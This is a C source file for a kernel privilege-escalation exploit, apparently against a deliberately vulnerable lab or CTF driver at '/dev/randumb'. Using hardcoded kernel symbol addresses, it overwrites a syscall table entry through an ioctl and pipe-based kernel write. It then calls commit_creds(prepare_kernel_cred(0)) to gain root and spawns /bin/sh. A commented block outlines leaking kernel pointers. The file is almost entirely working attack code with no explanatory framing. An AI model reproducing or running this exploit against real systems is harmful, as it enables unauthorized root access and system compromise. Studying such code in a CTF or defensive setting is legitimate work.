#define stdin               0
#define stdout              1
#define stderr              2

#define EOF                -1
#define NULL                0
#define O_RDONLY            0
#define O_WRONLY            1
#define O_RDWR              2

#define EXIT_SUCCESS        0
#define EXIT_FAILURE       -1

#define IOCTL_GET_SETTINGS -0xff
#define IOCTL_SET_SETTINGS -0x100

#define CHARSET_NONE        0
#define CHARSET_NUM         1
#define CHARSET_UPPER       2
#define CHARSET_LOWER       4

#define DEBUG_NONE          0
#define DEBUG_INFO          1
#define DEBUG_ALL           2

#define SYS_CALL_TABLE      0x8000e4e4
#define COMMIT_CREDS        0x8003bdf4
#define PREPARE_KERNEL_CRED 0x8003c14c

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
 
_commit_creds commit_creds = (_commit_creds) COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CRED;

typedef struct settings_t {
        int  charset;
        int  debug;
        int  debug_time;
        int  debug_uid;
} settings;

void exit(int status);
unsigned int read(int fd, void *buf, unsigned int count);
unsigned int write(int fd, const void *buf, unsigned int count);
int open(const char *pathname, int flags, int mode);
int close(int fd);
int pipe(int pipefd[2]);
int ioctl(int fd, unsigned int cmd, unsigned long arg);
int execve(const char *filename, char *const argv[], char *const envp[]);
int getuid();
int mkdir(const char *pathname, unsigned short mode);
int pwn();

void *memset(void *dst, int c, unsigned int n){

	if (n){
		char *d = dst;

		do {
			*d++ = c;
		} while (--n);
	}

	return dst;
}

void print(const char *str){

	while (*str){
		write(stdout, str, 1);
		str++;
	}

	return;
}

void digits(unsigned int n){

	char t[16] = "0123456789abcdef";
	char c[16] = "";

	int i, v = n, x = 0;
	for (i = 7; i >= 0; i--){
		x    = v & 0xf;
		c[i] = t[x];
		v    = (v >> 4);
	}

	print("0x");
	print(c);
}

int getroot(){

	commit_creds(prepare_kernel_cred(0));
	return -1337;
}

void _start(){

	int fd;
	int pipefd[2];

	unsigned long a = &getroot;
	unsigned long b = SYS_CALL_TABLE + (223 * 4);

	print("[+] exploit started...\n");

	mkdir("/tmp/randumb.log", 0777);

	pipe(pipefd);

	fd = open("/dev/randumb", O_RDONLY, 0);
	if (fd < 0) {
		print("[-] error: open()");
		exit(EXIT_FAILURE);
	}

	settings s;

	// The following is used when the attacker wants to get a leak,
	// to target things like task_struct (used for 4.* kernels).
    /*
	memset(&s, 0, sizeof(settings));
	ioctl(fd, IOCTL_GET_SETTINGS, &s);

	print("[i] leak1:  "); digits(s.debug_time); print("\n");
	print("[i] leak2:  "); digits(s.debug_uid); print("\n");
	*/

	s.debug = 1;
	ioctl(fd, IOCTL_SET_SETTINGS, &s);

	write(pipefd[1], &a, 4);
	read(pipefd[0], b, 4);

	close(fd);

	if (pwn() == -1337 && getuid() == 0){

		print("[+] got root!\n");

		char *argx[] = {"/bin/sh", NULL};
		char *envx[] = {NULL};
		execve(argx[0], argx, envx);
	}

	exit(EXIT_SUCCESS);
}